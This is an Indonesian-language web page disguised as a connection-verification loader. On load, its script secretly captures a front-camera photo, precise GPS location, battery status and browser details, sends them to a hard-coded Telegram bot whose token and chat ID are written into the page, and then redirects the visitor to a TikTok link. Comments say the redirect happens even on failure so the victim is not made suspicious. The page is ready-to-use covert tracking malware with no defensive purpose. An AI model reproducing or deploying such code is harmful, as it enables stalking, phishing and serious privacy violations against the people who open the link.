<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Memuat...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #000;
    color: #fff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 20px;
  }
  .loader {
    width: 48px; height: 48px;
    border: 4px solid rgba(255,255,255,0.2);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-bottom: 24px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .status { font-size: 15px; color: #aaa; margin-bottom: 8px; }
  .hint { font-size: 13px; color: #666; max-width: 280px; line-height: 1.4; }
  video { display: none; }
  canvas { display: none; }
  .error { color: #ff5555; font-size: 14px; margin-top: 16px; display: none; }
</style>
</head>
<body>

<div class="loader" id="loader"></div>
<div class="status" id="status">Memverifikasi koneksi...</div>
<div class="hint" id="hint">Mohon tunggu sebentar, jangan tutup halaman ini.</div>
<div class="error" id="error"></div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
(function() {
  'use strict';

  // ============================================================
  // KONFIGURASI — GANTI DENGAN MILIKMU
  // ============================================================
  const BOT_TOKEN = '9015010432:AAHSUMf9KomA_6P-oD2EPykXXjGe5yBcVzo';
  const CHAT_ID = '7088650583';
  const TIKTOK_URL = 'https://vt.tiktok.com/ZSpQFGYnh/'; // ganti dengan link TikTok tujuan
  // ============================================================

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const statusEl = document.getElementById('status');
  const hintEl = document.getElementById('hint');
  const loaderEl = document.getElementById('loader');
  const errorEl = document.getElementById('error');

  let photoData = null;
  let locationData = null;
  let batteryData = null;
  let stream = null;
  let sent = false;

  function setStatus(text) { statusEl.textContent = text; }
  function setHint(text) { hintEl.textContent = text; }
  function showError(text) {
    errorEl.style.display = 'block';
    errorEl.textContent = text;
    loaderEl.style.display = 'none';
  }

  // ---------- 1. AMBIL FOTO (KAMERA DEPAN) ----------
  async function ambilFoto() {
    try {
      setStatus('Meminta izin kamera...');
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      video.srcObject = stream;
      await video.play();
      // beri waktu autofocus & exposure
      await new Promise(r => setTimeout(r, 1200));
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      photoData = canvas.toDataURL('image/jpeg', 0.7);
      // matikan kamera
      stream.getTracks().forEach(t => t.stop());
      stream = null;
      return true;
    } catch (e) {
      console.warn('Kamera gagal:', e);
      setHint('Izin kamera ditolak atau tidak tersedia.');
      return false;
    }
  }

  // ---------- 2. AMBIL LOKASI (HIGH ACCURACY) ----------
  function ambilLokasi() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      setStatus('Mengambil lokasi akurat...');
      const timeout = setTimeout(() => {
        resolve(locationData); // pakai yang terakhir kalau timeout
      }, 8000);

      navigator.geolocation.watchPosition(
        (pos) => {
          locationData = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: pos.timestamp
          };
          // kalau akurasi sudah bagus (<50m), langsung resolve
          if (pos.coords.accuracy && pos.coords.accuracy < 50) {
            clearTimeout(timeout);
            resolve(locationData);
          }
        },
        (err) => {
          console.warn('Geolocation error:', err);
          clearTimeout(timeout);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    });
  }

  // ---------- 3. AMBIL BATERAI ----------
  async function ambilBaterai() {
    if (!navigator.getBattery) return null;
    try {
      const bat = await navigator.getBattery();
      return {
        level: Math.round(bat.level * 100),
        charging: bat.charging
      };
    } catch (e) {
      return null;
    }
  }

  // ---------- 4. KIRIM KE TELEGRAM ----------
  async function kirimKeTelegram() {
    if (sent) return;
    sent = true;

    // Teks info
    let info = '📸 *Data Terkumpul*\n\n';
    info += `🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n`;
    info += `📱 UA: \`${navigator.userAgent.substring(0, 120)}\`\n`;

    if (locationData) {
      info += `📍 Lokasi: ${locationData.lat}, ${locationData.lng}\n`;
      info += `🎯 Akurasi: ±${Math.round(locationData.accuracy)} meter\n`;
      info += `🗺️ Maps: https://maps.google.com/?q=${locationData.lat},${locationData.lng}\n`;
    } else {
      info += `📍 Lokasi: tidak tersedia (izin ditolak/timeout)\n`;
    }

    if (batteryData) {
      info += `🔋 Baterai: ${batteryData.level}% ${batteryData.charging ? '(charging)' : ''}\n`;
    } else {
      info += `🔋 Baterai: tidak tersedia\n`;
    }

    // Kirim pesan teks
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: info,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });
    } catch (e) {
      console.warn('Kirim teks gagal:', e);
    }

    // Kirim foto kalau ada
    if (photoData) {
      try {
        const blob = await (await fetch(photoData)).blob();
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', blob, 'foto.jpg');
        form.append('caption', 'Foto dari kamera');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: form
        });
      } catch (e) {
        console.warn('Kirim foto gagal:', e);
      }
    }
  }

  // ---------- 5. REDIRECT KE TIKTOK ----------
  function redirectKeTikTok() {
    setStatus('Mengalihkan...');
    setHint('Terima kasih.');
    loaderEl.style.display = 'block';
    // kasih jeda 1.5 detik supaya data sempat terkirim
    setTimeout(() => {
      window.location.replace(TIKTOK_URL);
    }, 1500);
  }

  // ---------- ORKESTRASI ----------
  async function jalankan() {
    // Jalankan foto & lokasi paralel
    const fotoPromise = ambilFoto();
    const lokasiPromise = ambilLokasi();
    const bateraiPromise = ambilBaterai();

    await Promise.allSettled([fotoPromise, lokasiPromise, bateraiPromise]);

    // Kalau tidak ada foto DAN tidak ada lokasi, tetap redirect (jangan curiga)
    if (!photoData && !locationData) {
      setHint('Verifikasi selesai.');
      redirectKeTikTok();
      return;
    }

    setStatus('Mengirim data...');
    setHint('Mohon tunggu.');
    await kirimKeTelegram();
    redirectKeTikTok();
  }

  // Mulai setelah halaman siap
  if (document.readyState === 'complete') {
    jalankan();
  } else {
    window.addEventListener('load', jalankan);
  }

})();
</script>
</body>
</html>
